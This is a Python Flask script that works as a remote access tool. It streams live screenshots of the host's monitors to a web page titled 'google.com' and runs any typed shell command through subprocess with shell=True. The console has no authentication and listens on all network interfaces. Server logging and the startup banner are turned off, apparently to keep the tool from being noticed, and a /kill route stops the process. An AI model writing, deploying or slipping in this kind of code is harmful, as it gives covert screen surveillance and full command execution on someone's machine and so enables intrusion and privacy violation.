import threading, time, base64, subprocess
from flask import Flask, request, render_template, jsonify, render_template_string
from PIL import Image
from flask_bootstrap import Bootstrap
import json, io
from os import getpid as pid
from os import kill as gg
from signal import SIGINT as shut
import logging
import mss

app = Flask(__name__)
import flask.cli
flask.cli.show_server_banner = lambda *args: None

logging.getLogger("werkzeug").disabled = True
app.secret_key = 'your_secret_key_here'  # Set your secret key
Bootstrap(app)
HTml = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>google.com</title>
    <style>
        body {
            font-family: monospace;
            background-color: #000;
            color: #fff;
            margin: 0;
            display: flex;
            height: 100vh;
            overflow: hidden;
        }
        #left {
            width: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            border-right: 1px solid #333;
        }
        #right {
            width: 50%;
            padding: 10px;
            display: flex;
            flex-direction: column;
        }
        #console {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        #command {
            width: 100%;
            background: none;
            border: none;
            color: #fff;
            outline: none;
        }
        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            flex: 1;
            overflow-y: auto;
        }
        img {
            max-width: 100%;
            max-height: 100%;
        }
        #screenForm {
            margin-top: 10px;
            background-color: #000;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        #screenSelector {
            background-color: #000;
            color: #fff;
            border: 1px solid #fff;
            padding: 5px;
        }
        #screenForm button {
            background-color: #000;
            color: #fff;
            border: 1px solid #fff;
            padding: 5px 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="left">
        <img id="screen" src="" alt="Screen Feed">
        <form id="screenForm" action="/set_screen" method="post">
            <select id="screenSelector" name="screen_id">
                <option value="0">Screen 1</option>
                <option value="1">Screen 2</option>
            </select>
            <button type="submit">Set Screen</button>
        </form>
    </div>
    <div id="right">
        <div id="console">
            <pre id="output"></pre>
            <form id="commandForm" action="/execute" method="post">
                > <input type="text" id="command" name="command" autocomplete="off" autofocus>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('commandForm').onsubmit = async function (event) {
            event.preventDefault();
            const command = document.getElementById('command').value.trim();
            if (command === 'cls' || command === 'clear') {
                document.getElementById('output').textContent = '';
                document.getElementById('command').value = '';
                return;
            }
            const response = await fetch('/execute', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command }) });
            const result = await response.json();
            const output = document.getElementById('output');
            output.textContent += `> ${command}\n${result.output}\n`;
            document.getElementById('command').value = '';
            output.scrollTop = output.scrollHeight;
        };

        document.getElementById('screenForm').onsubmit = async function (event) {
            event.preventDefault();
            const screen_id = document.getElementById('screenSelector').value;
            await fetch('/set_screen', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ screen_id }) });
        };

        async function updateScreen() {
            const response = await fetch('/screenfeed/', { method: 'POST' });
            const data = await response.json();
            if (data[0]) {
                document.getElementById('screen').src = 'data:image/jpeg;base64,' + data[1];
            }
            setTimeout(updateScreen, 1000 / 5);
        }
        updateScreen();
    </script>
</body>
</html>
"""

class Screen:
    def __init__(self):
        self.FPS = 60
        self.screenbuf = ""
        self.screenfile = io.BytesIO()
        self.screen_id = 0  # Default to first screen
        threading.Thread(target=self.getframes).start()

    def __del__(self):
        self.screenfile.close()

    def set_screen(self, screen_id):
        self.screen_id = screen_id

    def getframes(self):
        with mss.mss() as sct:
            while True:
                monitor = sct.monitors[self.screen_id + 1]  # mss monitors are 1-indexed
                screenshot = sct.grab(monitor)
                self.screenfile.seek(0)
                self.screenfile.truncate(0)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                img.save(self.screenfile, format="jpeg", quality=65)
                self.screenbuf = base64.b64encode(self.screenfile.getvalue())
                time.sleep(1.0/self.FPS)

    def gen(self):
        return self.screenbuf.decode()

screenlive = Screen()

@app.route('/')
def welcome():
    return render_template_string(HTml)

@app.route('/screenfeed/', methods=["POST"])
def screenfeed():
    return json.dumps([True, screenlive.gen()])

@app.route('/execute', methods=['POST'])
def execute():
    data = request.get_json()
    command = data.get('command')
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        output = str(e)
    return jsonify({'output': output})

@app.route('/set_screen', methods=['POST'])
def set_screen():
    data = request.get_json()
    screen_id = int(data.get('screen_id', 0))
    screenlive.set_screen(screen_id)
    return jsonify({'status': 'Screen updated'})

@app.route('/kill')
def shutdown():
    pd = pid()
    gg(pd, shut)
    return(":)")

if __name__ == '__main__':
    try:
        app.run(host='0.0.0.0', port=3131, threaded=True)
    except Exception as e:
        exit()
